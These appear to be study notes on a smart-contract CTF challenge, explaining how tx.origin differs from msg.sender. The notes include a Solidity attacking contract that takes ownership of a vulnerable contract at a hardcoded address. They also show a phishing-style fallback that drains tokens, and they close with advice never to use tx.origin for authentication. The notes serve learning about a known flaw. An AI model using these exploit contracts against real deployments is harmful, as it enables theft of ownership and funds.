- [diff between tx.origin & msg.sender](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
	- `msg.sender`
		- gives direct sender of the msg *(user wallet or another smart contract)*
		- checks where the external function call directly came from
	- `tx.origin`
		- original user wallet that initialized the tx
		- the origin addr of potentially an entire chain of txs & calls
		- `tx.origin` can be only user wallets, not contract ones

## Exploitation
- We can trick the `(tx.origin != msg.sender)` by spoofing `msg.sender`
	- `tx.origin` will be our user address *(i.e `owner` from `PhoneChain`)*
	- `msg.sender` will be the address of the attacking contract
	- thus bypassing the check
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    // change the owner based on tx.origin
    // we can spoof this
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract PhoneChain {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function claimOwnership() payable public{
    Telephone(0x9F728A9a2B2c6AC2A008F828086DB24FF5e5fA9d).changeOwner(owner);
  }
}
```

## Takeaways
- confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/)
	- use `tx.origin` to determine whose tokens to transfer
		```solidity
		function transfer(address _to, uint _value) {
			tokens[tx.origin] -= _value;
			tokens[_to] += _value;
		}
		```
	- attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract
		- `tx.origin`: victim addr while `msg.sender` is the malicious contract's addr
		- results in funds being transferred from the victim to the attacker
		```solidity
		function () payable {
			token.transfer(attackerAddr, 10000);
		}
		```
- don't use `tx.origin` for authentication purposes
